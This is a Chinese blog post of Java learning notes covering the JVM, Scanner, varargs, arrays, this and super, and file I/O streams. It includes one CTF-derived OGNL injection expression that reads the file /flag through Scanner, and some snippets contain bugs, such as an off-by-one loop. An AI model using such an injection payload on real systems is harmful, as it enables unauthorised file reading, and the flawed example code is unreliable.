

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Zer0peach">
  <meta name="keywords" content="">
  
    <meta name="description" content="java基础直接看Boogipop大佬的文章，贼全面 ，我就记录一些不会的 JVM 角度说进程与线程之间的关系一个运行的exe就是一个进程，进程可以有多个线程 同一个进程中的多个线程共享堆和方法区 每个线程有独立的自己的程序计数器、虚拟机栈和本地方法栈 多线程并不能提高运行速度，只能提高CPU使用效率 JVM在线程中执行一个方法时，会创建一个栈帧入栈并执行，不管该栈帧是正常结束还是异常，栈帧都会销">
<meta property="og:type" content="article">
<meta property="og:title" content="java基础和springboot">
<meta property="og:url" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/index.html">
<meta property="og:site_name" content="Zer0peach can&#39;t think">
<meta property="og:description" content="java基础直接看Boogipop大佬的文章，贼全面 ，我就记录一些不会的 JVM 角度说进程与线程之间的关系一个运行的exe就是一个进程，进程可以有多个线程 同一个进程中的多个线程共享堆和方法区 每个线程有独立的自己的程序计数器、虚拟机栈和本地方法栈 多线程并不能提高运行速度，只能提高CPU使用效率 JVM在线程中执行一个方法时，会创建一个栈帧入栈并执行，不管该栈帧是正常结束还是异常，栈帧都会销">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911221347848.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911224602382.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225731256.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225746289.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911232058359.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912102708510.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912112835162.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161000684.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160546330.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160804466.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161643123.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163225847.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163400091.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164032098.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164049132.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164744829.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913165341467.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230914183413701.png">
<meta property="article:published_time" content="2023-09-11T13:16:31.000Z">
<meta property="article:modified_time" content="2023-09-18T15:17:57.755Z">
<meta property="article:author" content="Zer0peach">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://zer0peach.github.io/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png">
  
  
  
  <title>java基础和springboot - Zer0peach can&#39;t think</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Zer0peach&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="java基础和springboot"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-11 21:16" pubdate>
          2023年9月11日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          20k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          168 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">java基础和springboot</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a>java基础</h1><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/JavaSE_%E5%9F%BA%E7%A1%80/">直接看Boogipop大佬的文章，贼全面</a> ，我就记录一些不会的</p>
<h2 id="JVM-角度说进程与线程之间的关系"><a href="#JVM-角度说进程与线程之间的关系" class="headerlink" title="JVM 角度说进程与线程之间的关系"></a>JVM 角度说进程与线程之间的关系</h2><p>一个运行的exe就是一个进程，进程可以有多个线程</p>
<p>同一个进程中的多个线程共享堆和方法区</p>
<p>每个线程有独立的自己的程序计数器、虚拟机栈和本地方法栈</p>
<p>多线程并不能提高运行速度，只能提高CPU使用效率</p>
<h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>在线程中执行一个方法时，会创建一个栈帧入栈并执行，不管该栈帧是正常结束还是异常，栈帧都会销毁</p>
<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>SICTF看到一个很秀的操作</p>
<div class="code-wrapper"><pre><code class="hljs reasonml">(#a=<span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">io</span>.File(<span class="hljs-string">&quot;/flag&quot;</span>)</span>).next<span class="hljs-literal">()</span>)

<span class="hljs-comment">//“#a”是因为使用OGNL表达式</span></code></pre></div>

<p>读取内容</p>
<p>两种方式读取<code>next()，nextline()</code></p>
<p><code>next()</code>以<strong>空格</strong>为分隔符，<code>nextline()</code>以<strong>回车</strong>为分隔符</p>
<div class="code-wrapper"><pre><code class="hljs abnf">Scanner test <span class="hljs-operator">=</span> new Scanner(System.in)<span class="hljs-comment">;</span>
if(test.hasNext())&#123;
	String a <span class="hljs-operator">=</span> test.next()<span class="hljs-comment">;</span>
	System.out.println(a)<span class="hljs-comment">;</span>
&#125;</code></pre></div>

<p>验证输入有<code>hasNextInt</code>、<code>hasNextDouble</code>等，然后使用对应的<code>nextInt</code>、<code>nextDouble</code>等接收参数</p>
<h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><p>是在src目录下运行，所以加上路径</p>
<div class="code-wrapper"><pre><code class="hljs stylus">java com<span class="hljs-selector-class">.boogipop</span><span class="hljs-selector-class">.www</span><span class="hljs-selector-class">.base</span><span class="hljs-selector-class">.DemoReload</span> <span class="hljs-selector-tag">i</span> am boogipop</code></pre></div>

<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png" srcset="/img/loading.gif" lazyload alt="image-20230911213326053"></p>
<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>简单来说就是函数的参数数量不限</p>
<p>（参数类型 <code>...</code> 变量名）   （加三个点）</p>
<div class="code-wrapper"><pre><code class="hljs typescript">package org.<span class="hljs-property">example</span>.<span class="hljs-property">basic</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;
        <span class="hljs-title function_">print</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">78</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">432</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">double ... <span class="hljs-built_in">number</span></span>)&#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>==<span class="hljs-number">0</span>)&#123;
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;no args&quot;</span>);
            <span class="hljs-keyword">return</span>;
        &#125;
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">for</span>(int i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>;i++)&#123;
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-built_in">number</span>[i]);
            &#125;
        &#125;
    &#125;
&#125;</code></pre></div>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>定义一个数组，<code>int[] num = &#123;1,2,3,4,5,6&#125;</code></p>
<p>然后输入<code>num.for</code></p>
<p>就会出来增强for循环</p>
<div class="code-wrapper"><pre><code class="hljs css">for (int <span class="hljs-selector-tag">i</span> : num) &#123;
    
&#125;</code></pre></div>

<p>这里的<code>i</code>相当于<code>python</code>中的<code>for i in a</code>，直接就是数组内容</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911221347848.png" srcset="/img/loading.gif" lazyload alt="image-20230911221347848"></p>
<h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p><code>Arrays.toString()</code>输出数组内容</p>
<p><code>Arrays.sort()</code>给数组排序</p>
<p><code>Arrays.fill()</code>特定值填充数据</p>
<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span><span class="hljs-literal">[]</span> nm = &#123;<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">34</span>,<span class="hljs-number">15</span>,<span class="hljs-number">06</span>&#125;;
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(nm);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>sort(nm);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>);     #数组下标<span class="hljs-number">2</span>-<span class="hljs-number">4</span>，左闭右开，填充<span class="hljs-number">0</span>
<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);
        
##
<span class="hljs-literal">[I@<span class="hljs-number">677327</span><span class="hljs-identifier">b6</span>  #数组地址</span>
<span class="hljs-literal">[<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">34</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>]</span>
<span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>]</span>
<span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]</span>
<span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]</span></code></pre></div>

<h2 id="构造函数、this、this-、super、super-、this动态绑定"><a href="#构造函数、this、this-、super、super-、this动态绑定" class="headerlink" title="构造函数、this、this()、super、super()、this动态绑定"></a>构造函数、this、this()、super、super()、this动态绑定</h2><blockquote>
<p>this ：代表“当前对象”</p>
<p>this()：就是调用“当前对象”的无参构造方法<br>this、this()，new的谁就指向谁。父类里有this也是指向的new出来的对象。</p>
<p>this的动态绑定：包括静态方法和静态成员变量是前期绑定、访问方法是后期绑定</p>
<p>super：指向父类</p>
<p>super()：就是调用父类的无参构造方法<br>super、super()，仅指向上一级父类。</p>
</blockquote>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911224602382.png" srcset="/img/loading.gif" lazyload alt="image-20230911224602382"></p>
<p><code>A</code>为父类，当前对象就是<code>new B</code>的<code>bb</code>，<code>s3()</code>的<code>super.s2()</code>即调用父类的<code>s2()</code>，<code>A</code>中<code>this.s1()</code>调用当前对象的<code>s1()</code>，即<code>bb</code>的<code>s1()</code>，也就是<code>B</code>中的<code>s1()</code></p>
<p>所以输出<code>B中的s1</code></p>
<p><code>A</code>不加<code>this</code>的话也是输出<code>B中的s1</code>，因为<code>B</code>为子类，相当于重写了<code>s1</code>方法</p>
<ul>
<li><h4 id="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"><a href="#调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性" class="headerlink" title="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"></a>调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性</h4></li>
</ul>
<p>两个案例理解一下这句话</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225731256.png" srcset="/img/loading.gif" lazyload alt="image-20230911225731256"></p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225746289.png" srcset="/img/loading.gif" lazyload alt="image-20230911225746289"></p>
<h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断两个类之间有无父子关系</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911232058359.png" srcset="/img/loading.gif" lazyload alt="image-20230911232058359"></p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912102708510.png" srcset="/img/loading.gif" lazyload alt="image-20230912102708510"></p>
<h2 id="静态代码块、匿名代码块、构造代码块"><a href="#静态代码块、匿名代码块、构造代码块" class="headerlink" title="静态代码块、匿名代码块、构造代码块"></a>静态代码块、匿名代码块、构造代码块</h2><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>类似占位符，只能定义不能写</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>跟抽象类一样</p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>套娃</p>
<h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p>try catch finally throw throws</p>
<p>finally不管怎样都会执行</p>
<h1 id="java-io"><a href="#java-io" class="headerlink" title="java io"></a>java io</h1><h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> FileOutputStream(&quot;flag&quot;); //创建flag文件
String hello = &quot;Hello World!&quot;;
<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-number">97</span>);
<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;a&#x27;</span>);
<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(hello.getBytes());    //转为字节数组
<span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();
<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;finish&quot;);</code></pre></div>

<h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);
<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>) &#123;      
    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf(<span class="hljs-keyword">read</span>+&quot;,&quot;);
    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>+&quot;,&quot;);
&#125;
<span class="hljs-keyword">in</span>.<span class="hljs-keyword">close</span>();</code></pre></div>

<p>每经过一次<code>in.read()</code>就会指向下一个内容，所以先把值赋给一个变量</p>
<p><code>in.read()</code>返回<code>int</code>类型</p>
<div class="code-wrapper"><pre><code class="hljs go">FileInputStream in = <span class="hljs-built_in">new</span> FileInputStream(<span class="hljs-string">&quot;flag&quot;</span>);
<span class="hljs-type">byte</span>[] buf = <span class="hljs-built_in">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">//</span>
System.out.<span class="hljs-built_in">println</span>(in.read(buf)); <span class="hljs-comment">//把内容读入数组(缓冲区)，输出的是数组长度</span>
System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); 
<span class="hljs-comment">//0为偏移，1为读取的长度，不能超过数组的长度</span>
in.<span class="hljs-built_in">close</span>();</code></pre></div>

<h3 id="BufferedInputStream"><a href="#BufferedInputStream" class="headerlink" title="BufferedInputStream"></a>BufferedInputStream</h3><p>读入缓冲区，作用跟<code>byte[] buf = new byte[3];</code>一样</p>
<p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912112835162.png" srcset="/img/loading.gif" lazyload alt="image-20230912112835162"></p>
<div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);
BufferedInputStream bif = <span class="hljs-built_in">new</span> BufferedInputStream(<span class="hljs-keyword">in</span>);
<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=bif.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>)&#123;
    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.print((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>);
&#125;

bif.<span class="hljs-keyword">close</span>(); //也会关闭<span class="hljs-keyword">in</span></code></pre></div>



<h3 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h3><div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream out=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;1.txt&quot;</span>)</span>;
BufferedOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-constructor">BufferedOutputStream(<span class="hljs-params">out</span>)</span>;
<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;
     bos.write(<span class="hljs-string">&quot;helloworld,&quot;</span>.get<span class="hljs-constructor">Bytes()</span>); <span class="hljs-comment">//到这一步不会写入文件，只是写入了缓冲区</span>
     bos.flush<span class="hljs-literal">()</span>;<span class="hljs-comment">//刷新缓冲区写入文件</span>
&#125;
bos.close<span class="hljs-literal">()</span>;<span class="hljs-comment">//关闭的时候也会调用flush，同时关闭out</span></code></pre></div>

<h3 id="ObjectInputStream和ObjectOutputStream"><a href="#ObjectInputStream和ObjectOutputStream" class="headerlink" title="ObjectInputStream和ObjectOutputStream"></a>ObjectInputStream和ObjectOutputStream</h3><p>序列化与反序列化</p>
<p>重写方法</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException


<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream oos)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException
&#123;
	oos.defaultReadObject();
	
&#125;</code></pre></div>



<h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>使用字节流读取中文会出现乱码</p>
<h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><div class="code-wrapper"><pre><code class="hljs gradle">FileReader fr=<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;resource/test.txt&quot;</span>);
<span class="hljs-keyword">char</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">//创建一个缓冲区</span>
<span class="hljs-keyword">int</span> <span class="hljs-keyword">count</span>=<span class="hljs-number">0</span>;
<span class="hljs-keyword">while</span>((<span class="hljs-keyword">count</span>=fr.<span class="hljs-keyword">read</span>(buf))!=-<span class="hljs-number">1</span>)&#123;
    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">count</span>));</code></pre></div>

<h3 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h3><div class="code-wrapper"><pre><code class="hljs abnf">FileWriter fw<span class="hljs-operator">=</span>new FileWriter(<span class="hljs-string">&quot;writer.txt&quot;</span>)<span class="hljs-comment">;</span>
//写入
for(int i<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;i&lt;10;i++)&#123;</span>
    fw.write(<span class="hljs-string">&quot;java is the best&quot;</span>)<span class="hljs-comment">;</span>
    fw.flush()<span class="hljs-comment">;</span>
&#125;
fw.close()<span class="hljs-comment">;</span></code></pre></div>

